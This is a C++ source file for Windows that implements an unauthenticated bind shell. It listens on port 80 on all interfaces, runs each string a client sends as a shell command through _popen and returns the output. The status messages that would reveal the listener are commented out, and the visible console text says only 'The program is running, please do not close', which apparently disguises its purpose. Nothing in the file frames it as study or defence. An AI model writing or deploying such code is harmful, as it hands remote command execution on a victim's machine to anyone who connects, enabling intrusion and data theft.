#include <iostream>
#include <cstring>
#include <winsock2.h>
#include <thread>
#include <process.h>

#pragma comment(lib, "ws2_32.lib")

#define PORT 80
#define BUFFER_SIZE 1024


std::string run_command(const std::string& command) {
    std::string result;
    FILE* pipe = _popen(command.c_str(), "r");
    if (pipe) {
        char buffer[BUFFER_SIZE];
        while (fgets(buffer, BUFFER_SIZE, pipe)!= nullptr) {
            result += buffer;
        }
        _pclose(pipe);
    }
    return result;
}

void handle_connection(SOCKET clientSocket) {
    char buffer[BUFFER_SIZE];
    while (true) {
        int bytesRead = recv(clientSocket, buffer, BUFFER_SIZE - 1, 0);
        if (bytesRead <= 0) {
            break;
        }
        buffer[bytesRead] = '\0';
        std::string command(buffer);
        if (command.empty()) {
            continue;
        } else if (command == "exit") {
            break;
        } else {
            std::string result = run_command(command);
            if (result.empty()) {
                result = "Command error.";
            }
            send(clientSocket, result.c_str(), result.length(), 0);
        }
    }
    closesocket(clientSocket);
}

void server_thread_function() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData)!= 0) {
        std::cerr << "WSAStartup failed." << std::endl;
        return;
    }

    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == INVALID_SOCKET) {
        std::cerr << "Error creating server socket." << std::endl;
        WSACleanup();
        return;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr("0.0.0.0");
    serverAddr.sin_port = htons(PORT);
    

    if (bind(serverSocket, reinterpret_cast<SOCKADDR*>(&serverAddr), sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Bind failed." << std::endl;
        closesocket(serverSocket);
        WSACleanup();
        return;
    }

    if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) {
        std::cerr << "Listen failed." << std::endl;
        closesocket(serverSocket);
        WSACleanup();
        return;
    }

    //std::cout << "Server listening on 0.0.0.0:" << PORT << std::endl;

    while (true) {
        SOCKET clientSocket = accept(serverSocket, nullptr, nullptr);
        if (clientSocket == INVALID_SOCKET) {
            std::cerr << "Accept failed." << std::endl;
            break;
        }
        std::cout << "Connected by client." << std::endl;
        std::thread connectionThread(handle_connection, clientSocket);
        connectionThread.detach();
    }

    closesocket(serverSocket);
    WSACleanup();
}

int main() {
    std::cout << "The program is running, please do not close.";
    std::thread serverThread(server_thread_function);
    serverThread.detach();

    //std::cout << "Server started. Press Enter to exit." << std::endl;
    char input;
    while (true) {
        std::cin >> input; // 等待用户输入一个字符
    }
    return 0;
}